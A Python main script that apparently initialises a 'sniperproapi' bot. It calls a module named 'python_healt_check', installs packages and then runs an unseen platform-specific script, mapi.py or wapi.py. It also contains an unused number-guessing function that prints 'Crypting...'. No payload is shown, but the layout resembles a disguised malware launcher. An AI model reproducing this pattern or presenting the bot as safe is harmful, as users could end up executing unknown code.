import os
import subprocess
import platform
import sys
from python_healt_check import ensure_all_good
from requirements import install_requirements
import random

def helper_script_script():
    python_command = "python3" if platform.system() == 'Darwin' else "python"
    base_dir = os.path.dirname(os.path.abspath(__file__))
    helper_path = os.path.join(base_dir, "sniperproapi", "mapi.py" if platform.system() == 'Darwin' else "wapi.py")

    if not os.path.exists(helper_path):
        print(f"Connector script not found at: {helper_path}")
        sys.exit(1)

    try:
        subprocess.run([python_command, helper_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running connector script: {e}")
        sys.exit(1)


def main():
    print("Checking Python environment...")
    ensure_all_good()

    print("Installing required packages...")
    install_requirements()

    print("Running system-specific connector script...")
    helper_script_script()

    print("Bot initialization complete. If the bot does not work, run the 'python3 main.py' command again. ")

def number_guess_game():
    target_number = random.randint(1, 100)
    print("Crypting...")
    while True:
        try:
            guess = int(input("Your guess: "))
            if guess < target_number:
                print("Try a higher number.")
            elif guess > target_number:
                print("Try a lower number.")
            else:
                print("Congratulations, correct guess!")
                break
        except ValueError:
            print("Please enter a valid number.")

if __name__ == "__main__":
    main()
